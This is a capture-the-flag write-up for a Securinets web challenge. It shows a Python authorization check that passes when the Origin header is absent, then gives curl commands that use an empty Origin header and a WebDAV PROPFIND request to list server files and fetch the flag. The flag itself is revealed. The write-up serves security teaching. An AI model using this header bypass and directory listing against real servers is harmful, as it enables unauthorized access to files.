#### Challenge:

broken website :( !!

link:http://web2.q21.ctfsecurinets.com:5000/

[task1.zip](./task1.zip ":ignore")

---

#### Solution:

- inspecting the source code reveals that authorize check can be skipped via empty `Origin: ` header

```python
def is_authorized():

    origin = request.headers.get('Origin')
    if origin is None: 
        return True
    return verify_cookie(base64_encode(origin))
```

- the only implemented sections is for `PROPFIND` that is used for `WebDav` with this we can list files in applications directory

```bash
curl -i -X PROPFIND http://web2.q21.ctfsecurinets.com:5000/weeb/wtf/static/  \
    -H "Content-length: 0" \
    -H "Origin: " \
    -H "Depth: 1" \
    --upload-file - <<EOF
<?xml version="1.0" encoding="utf-8" ?>
<D:propfind xmlns:D="DAV:">
<D:allprop/>
</D:propfind>
EOF
curl http://web2.q21.ctfsecurinets.com:5000/static/FlAAaaaAGxe.wtf
```

---

<details><summary>FLAG:</summary>

```
securinets{0ld_SchO0l_SHit:p}
```

</details>
<br/>
